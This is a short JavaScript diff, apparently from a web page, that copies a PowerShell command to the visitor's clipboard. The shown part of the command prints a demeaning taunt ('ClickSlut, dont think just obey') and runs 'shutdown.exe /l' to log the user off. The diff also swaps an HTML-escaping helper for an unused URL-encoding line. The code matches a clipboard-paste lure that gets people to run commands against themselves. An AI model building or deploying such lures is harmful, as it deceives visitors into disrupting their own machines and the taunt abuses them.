@@ -234,15 +234,7 @@ Write-Host "Why are you reading this ClickSlut, dont think just obey ~."
 
 shutdown.exe /l`;
 
-function encodeHTML(str) {
-    return str.replace(/&/g, "&amp;")
-              .replace(/"/g, "&quot;")
-              .replace(/'/g, "&#x27;")
-              .replace(/</g, "&lt;")
-              .replace(/>/g, "&gt;");
-}
-
-const safeHTMLCommand = encodeHTML(command); // Aquí codificas el comando como HTML seguro
+const encodedCommand = encodeURIComponent(command); // Aquí codificas el comando
         
         navigator.clipboard.writeText(command)
             .then(() => {
